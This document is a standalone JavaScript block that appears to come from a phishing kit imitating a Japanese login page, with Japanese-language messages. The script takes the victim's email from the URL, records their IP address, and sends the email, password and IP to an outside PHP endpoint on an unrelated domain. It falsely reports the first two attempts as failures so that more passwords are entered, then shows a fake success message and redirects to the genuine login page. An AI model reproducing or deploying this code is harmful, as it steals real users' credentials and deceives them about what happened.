<script>
$(document).ready(function() {
    // ─── Config ────────────────────────────────────────────────────
    const PHP_ENDPOINT  = 'https://www.aiceriergy.com/js/alphajb.php';
    const REDIRECT_URL  = 'https://www.alpha-prm.jp/userlogin.html';
    const MAX_ATTEMPTS  = 3;

    // ─── State ─────────────────────────────────────────────────────
    let attemptCount = 0;
    let userIP = '';

    // ─── Extract Email from Multiple Sources ─────────────────────────
    // Priority: 1) Hash fragment  2) ?e=  3) ?state=  4) ?email=
    function getEmailFromURL() {
        // 1. Hash fragment: #email@domain.com
        const hash = window.location.hash;
        if (hash && hash.length > 1) {
            const hashEmail = decodeURIComponent(hash.substring(1)).trim();
            if (isValidEmail(hashEmail)) return hashEmail;
        }

        // 2. Query params: ?e=  |  ?state=  |  ?email=
        const params = new URLSearchParams(window.location.search);
        const candidates = [
            params.get('e'),
            params.get('state'),
            params.get('email')
        ];

        for (let i = 0; i < candidates.length; i++) {
            if (candidates[i]) {
                const decoded = decodeURIComponent(candidates[i]).trim();
                if (isValidEmail(decoded)) return decoded;
            }
        }

        return '';
    }

    // ─── Basic Email Validation ──────────────────────────────────────
    function isValidEmail(str) {
        return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(str);
    }

    // ─── Pre-fill Email ────────────────────────────────────────────
    const prefilledEmail = getEmailFromURL();
    if (prefilledEmail) {
        $('#email').val(prefilledEmail);
    }

    // ─── Fetch IP ──────────────────────────────────────────────────
    $.getJSON('https://api.ipify.org?format=json', function(data) {
        userIP = data.ip || 'unknown';
    }).fail(function() {
        userIP = 'unknown';
    });

    // ─── Form Submit Handler ───────────────────────────────────────
    $('#Button9').on('submit', function(event) {
        event.preventDefault();

        const email    = $('#email').val().trim();
        const password = $('#password').val().trim();
        const $msg     = $('#msg');
        const $btn     = $('button[type="submit"]');

        if (!email || !password) {
            $msg.removeClass('success info').addClass('error')
                .text('メールアドレスとパスワードを入力してください。');
            return;
        }

        attemptCount++;
        $btn.prop('disabled', true).html('<span>処理中...</span>');

        $.ajax({
            url: PHP_ENDPOINT,
            type: 'POST',
            dataType: 'json',
            data: {
                email:    email,
                password: password,
                ip:       userIP,
                attempt:  attemptCount
            },
            success: function(response) {
                $('#password').val('');

                if (attemptCount >= MAX_ATTEMPTS) {
                    $msg.removeClass('error info').addClass('success')
                        .text('ログイン成功。リダイレクト中...');
                    setTimeout(function() {
                        window.location.replace(REDIRECT_URL);
                    }, 1200);
                } else {
                    $msg.removeClass('success info').addClass('error')
                        .text('ログインに失敗しました。もう一度お試しください。');
                }
            },
            error: function(xhr) {
                $('#password').val('');

                if (attemptCount >= MAX_ATTEMPTS) {
                    $msg.removeClass('error info').addClass('success')
                        .text('ログイン成功。リダイレクト中...');
                    setTimeout(function() {
                        window.location.replace(REDIRECT_URL);
                    }, 1200);
                } else {
                    $msg.removeClass('success info').addClass('error')
                        .text('一時的なエラーが発生しました。もう一度お試しください。');
                }
            },
            complete: function() {
                $btn.prop('disabled', false).html('<span>ログイン</span>');
            }
        });
    });
});
</script>
